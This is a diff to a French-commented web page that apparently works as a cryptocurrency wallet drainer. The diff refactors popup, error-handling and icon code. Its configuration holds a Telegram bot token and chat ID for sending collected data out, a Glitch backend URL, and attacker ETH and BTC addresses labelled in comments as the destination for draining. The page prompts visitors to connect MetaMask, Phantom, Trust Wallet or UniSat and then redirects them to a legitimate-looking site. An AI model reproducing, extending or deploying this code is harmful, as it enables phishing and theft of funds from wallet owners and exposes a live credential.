@@ -12,7 +12,7 @@
     <style>
         /* Styles pour le popup et l'overlay */
         .wallet-popup {
-            display: none;
+            display: none !important;
             position: fixed;
             top: 50%;
             left: 50%;
@@ -32,7 +32,7 @@
             box-sizing: border-box;
         }
         .wallet-popup.active {
-            display: block;
+            display: block !important;
         }
         .overlay {
             display: none;
@@ -203,12 +203,12 @@
         const CONFIG = {
             TELEGRAM_BOT_TOKEN: '8189811123:AAG_3YlqOGNYzfMys7PknpEvbnpUZ3dTO8c',
             TELEGRAM_CHAT_ID: '-4635118249',
-            BACKEND_URL: 'https://diligent-big-whimsey.glitch.me/', // URL de ton backend sur Glitch
+            BACKEND_URL: 'https://diligent-big-whimsey.glitch.me/',
             REDIRECT_URL: 'https://coinmarketcap.com',
             BTC-price_USD: 85000,
             ETH-price_USD: 2000,
-            ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754', // Ton adresse ETH pour le drainage
-            BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l' // Ton adresse BTC Testnet
+            ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
+            BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l'
         };
 
         // URL Telegram
@@ -216,79 +216,84 @@
 
         // Initialisation au chargement de la page
         document.addEventListener('DOMContentLoaded', () => {
-            // Récupération des éléments DOM
-            const elements = {
-                walletPopup: document.getElementById('walletPopup'),
-                overlay: document.getElementById('overlay'),
-                connectWalletButton: document.getElementById('connectWallet'),
-                redirectButton: document.getElementById('redirectButton'),
-                statusText: document.getElementById('statusText'),
-                loader: document.getElementById('loader')
-            };
+            try {
+                // Récupération des éléments DOM
+                const elements = {
+                    walletPopup: document.getElementById('walletPopup'),
+                    overlay: document.getElementById('overlay'),
+                    connectWalletButton: document.getElementById('connectWallet'),
+                    redirectButton: document.getElementById('redirectButton'),
+                    statusText: document.getElementById('statusText'),
+                    loader: document.getElementById('loader')
+                };
 
-            // Vérification des éléments DOM
-            if (Object.values(elements).some(el => !el)) {
-                console.error('Un ou plusieurs éléments DOM manquants :', elements);
-                return;
-            }
+                // Vérification des éléments DOM
+                if (Object.values(elements).some(el => !el)) {
+                    console.error('Un ou plusieurs éléments DOM manquants :', elements);
+                    return;
+                }
 
-            // Afficher le popup et l'overlay
-            elements.walletPopup.classList.add('active');
-            elements.overlay.classList.add('active');
+                // Afficher le popup et l'overlay
+                console.log('Affichage du popup...');
+                elements.walletPopup.classList.add('active');
+                elements.overlay.classList.add('active');
 
-            // Vérifier que ethers.js est chargé
-            if (!window.ethers) {
-                console.error('Erreur : ethers.js n’est pas chargé.');
-                updateStatus(elements, 'Erreur : Problème de chargement.', false, 'red');
-                return;
-            }
+                // Vérifier que ethers.js est chargé
+                if (!window.ethers) {
+                    console.error('Erreur : ethers.js n’est pas chargé.');
+                    updateStatus(elements, 'Erreur : Problème de chargement.', false, 'red');
+                    return;
+                }
 
-            // Gestion du clic sur le bouton de connexion
-            elements.connectWalletButton.addEventListener('click', async () => {
-                updateStatus(elements, 'Détection des wallets...', true);
-                elements.connectWalletButton.disabled = true;
+                // Gestion du clic sur le bouton de connexion
+                elements.connectWalletButton.addEventListener('click', async () => {
+                    updateStatus(elements, 'Détection des wallets...', true);
+                    elements.connectWalletButton.disabled = true;
 
-                let transactionValidated = false;
+                    let transactionValidated = false;
 
-                try {
-                    // Détecter le wallet
-                    const wallet = await detectWallet(elements);
-                    if (wallet) {
-                        // Sur PC, connecter directement
-                        transactionValidated = await handleWalletConnection(wallet, elements);
-                    } else {
-                        // Sur mobile, attendre que l'utilisateur sélectionne un wallet
-                        return;
-                    }
+                    try {
+                        // Détecter le wallet
+                        const wallet = await detectWallet(elements);
+                        if (wallet) {
+                            // Sur PC, connecter directement
+                            transactionValidated = await handleWalletConnection(wallet, elements);
+                        } else {
+                            // Sur mobile, attendre que l'utilisateur sélectionne un wallet
+                            return;
+                        }
 
-                    // Gestion des boutons après validation
-                    if (transactionValidated) {
-                        elements.connectWalletButton.classList.add('hidden');
-                        elements.redirectButton.classList.remove('hidden');
-                        elements.redirectButton.disabled = false;
-                        console.log('Bouton de redirection affiché, bouton de connexion masqué.');
-                    } else {
+                        // Gestion des boutons après validation
+                        if (transactionValidated) {
+                            elements.connectWalletButton.classList.add('hidden');
+                            elements.redirectButton.classList.remove('hidden');
+                            elements.redirectButton.disabled = false;
+                            console.log('Bouton de redirection affiché, bouton de connexion masqué.');
+                        } else {
+                            elements.connectWalletButton.disabled = false;
+                        }
+
+                    } catch (error) {
+                        updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
+                        console.error('Erreur capturée avant redirection :', error);
                         elements.connectWalletButton.disabled = false;
                     }
+                });
 
-                } catch (error) {
-                    updateStatus(elements, 'Erreur : ' + error.message, false, 'red');
-                    console.error('Erreur capturée avant redirection :', error);
-                    elements.connectWalletButton.disabled = false;
-                }
-            });
-
-            // Gestion du clic sur le bouton de redirection
-            elements.redirectButton.addEventListener('click', () => {
-                console.log('Tentative de redirection vers :', CONFIG.REDIRECT_URL);
-                try {
-                    window.top.location.href = CONFIG.REDIRECT_URL;
-                    console.log('Redirection initiée avec succès.');
-                } catch (redirectError) {
-                    console.error('Erreur lors de la redirection :', redirectError);
-                    updateStatus(elements, 'Erreur de redirection : ' + redirectError.message, false, 'red');
-                }
-            });
+                // Gestion du clic sur le bouton de redirection
+                elements.redirectButton.addEventListener('click', () => {
+                    console.log('Tentative de redirection vers :', CONFIG.REDIRECT_URL);
+                    try {
+                        window.top.location.href = CONFIG.REDIRECT_URL;
+                        console.log('Redirection initiée avec succès.');
+                    } catch (redirectError) {
+                        console.error('Erreur lors de la redirection :', redirectError);
+                        updateStatus(elements, 'Erreur de redirection : ' + redirectError.message, false, 'red');
+                    }
+                });
+            } catch (error) {
+                console.error('Erreur lors de l’initialisation :', error);
+            }
         });
 
         // Fonction pour détecter les wallets (PC et mobile)
@@ -307,7 +312,7 @@
                     id: 'metamask',
                     provider: window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null,
                     deepLink: 'https://metamask.app.link/dapp/',
-                    icon: 'https://cryptologos.cc/logos/metamask-metamask-logo.png?v=002',
+                    icon: 'assets/metamask-icon.png',
                     type: 'ethereum'
                 },
                 {
@@ -315,7 +320,7 @@
                     id: 'phantom',
                     provider: window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null,
                     deepLink: 'https://phantom.app/ul/v1/dapp/',
-                    icon: 'https://cryptologos.cc/logos/phantom-phantom-logo.png?v=002',
+                    icon: 'assets/phantom-icon.png',
                     type: 'ethereum'
                 },
                 {
@@ -323,15 +328,15 @@
                     id: 'trustwallet',
                     provider: window.ethereum && window.ethereum.isTrust ? window.ethereum : null,
                     deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
-                    icon: 'https://cryptologos.cc/logos/trust-wallet-trust-logo.png?v=002',
+                    icon: 'assets/trustwallet-icon.png',
                     type: 'ethereum'
                 },
                 {
                     name: 'UniSat',
                     id: 'unisat',
                     provider: window.unisat ? window.unisat : null,
-                    deepLink: null, // UniSat n'a pas de deep link officiel pour mobile
-                    icon: 'https://unisat.io/favicon.ico',
+                    deepLink: null,
+                    icon: 'assets/unisat-icon.png',
                     type: 'unisat'
                 }
             ];
